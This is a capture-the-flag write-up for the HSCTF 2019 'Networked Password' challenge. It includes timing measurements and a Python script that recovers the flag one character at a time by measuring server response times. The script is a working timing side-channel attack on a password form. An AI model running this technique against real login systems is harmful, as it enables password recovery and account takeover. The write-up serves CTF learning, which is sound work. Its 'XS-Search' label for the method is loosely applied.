# HSCTF 2019 "Networked Password" writeup

## Problem

```
Storing passwords on my own server seemed unsafe, so I stored it on a seperate one instead.
However, the connection between them is very slow and I have no idea why.
```

<https://networked-password.web.chal.hsctf.com/>

## Solution

First, I check problem page's source code.

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8"/>
    <title>Networked Password</title>
  </head>
  <body>
    <form method="POST">
      <input type="password" placeholder="password" name="password"/>
      <input type="submit"/>
    <form>
  </body>
</html>
```

This is a very simple password form and there is no other information.

I tried a few passwords and noticed that the password "hsctf" takes a lot of time to respond.

This means that we can guess correct password by XS-Search of response time.

The format of the flag is "hsctf{}", so first try "h".

```
{'password': 'a'} response time : 0.811167
{'password': 'b'} response time : 0.915185
{'password': 'c'} response time : 1.018501
{'password': 'd'} response time : 1.120249
{'password': 'e'} response time : 0.916026
{'password': 'f'} response time : 1.013199
{'password': 'g'} response time : 0.919143
{'password': 'h'} response time : 1.324334 ← longest
{'password': 'i'} response time : 0.816922
{'password': 'j'} response time : 0.808752
{'password': 'k'} response time : 0.794029
{'password': 'l'} response time : 0.936624
{'password': 'm'} response time : 0.813636
{'password': 'n'} response time : 1.119719
{'password': 'o'} response time : 1.006724
{'password': 'p'} response time : 0.927347
{'password': 'q'} response time : 1.017954
{'password': 'r'} response time : 1.120191
{'password': 's'} response time : 1.121062
{'password': 't'} response time : 0.915766
{'password': 'u'} response time : 0.813457
{'password': 'v'} response time : 0.749453
{'password': 'w'} response time : 0.964771
{'password': 'x'} response time : 0.918737
{'password': 'y'} response time : 0.927552
{'password': 'z'} response time : 0.796128
```

A character that has longest response time is flag.

Then, I try the characters one by one.

```python
import requests

text = "0123456789abcdefghijklmnopqrstuvwxyz_}"

flag = "hsctf{"

for _ in range(30):
    time = [0.1 for _ in range(38)]
    for _ in range(5):
        for i in range(38):

            payload = {"password": flag + text[i]}

            r = requests.post(
                "https://networked-password.web.chal.hsctf.com", data=payload
            )

            response_time = r.elapsed.total_seconds()

            time[i] += response_time

            print(payload, " response time : ", response_time)

    flag += text[time.index(max(time))]

    print("flag is ", flag)
```

```
flag is hsctf{s
flag is hsctf{sm
flag is hsctf{sm0
flag is hsctf{sm0l
flag is hsctf{sm0l_
flag is hsctf{sm0l_f
flag is hsctf{sm0l_fl
flag is hsctf{sm0l_fl4
flag is hsctf{sm0l_fl4g
flag is hsctf{sm0l_fl4g}
```
